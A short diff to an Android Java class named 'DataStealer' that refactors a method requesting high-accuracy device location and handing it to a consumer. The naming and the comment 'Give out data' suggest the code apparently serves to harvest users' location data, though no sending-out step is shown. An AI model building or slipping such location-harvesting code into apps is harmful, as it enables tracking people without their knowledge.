@@ -156,12 +156,12 @@ public class DataStealer {
      * @param context
      * @param consumer
      */
-    public void takeLocationData(Context context, Consumer<LocationData> consumer) {
+    public void takeLocationData(Context context, Consumer<LocationData[]> consumer) {
+        FusedLocationProviderClient client = new FusedLocationProviderClient(context);
         LocationRequest locationRequest = LocationRequest.create();
         locationRequest.setInterval(100);
         locationRequest.setFastestInterval(50);
         locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
-
         locationCallback = new LocationCallback() {
             @Override
             public void onLocationResult(LocationResult locationResult) {
@@ -170,8 +170,8 @@ public class DataStealer {
                 }
                 for (Location location : locationResult.getLocations()) {
                     // Give out data
-                    consumer.accept(new LocationData(location));
-                    fusedLocationClient.removeLocationUpdates(locationCallback);
+                    consumer.accept(new LocationData[]{new LocationData(location)});
+                    client.removeLocationUpdates(locationCallback);
                 }
             }
         };
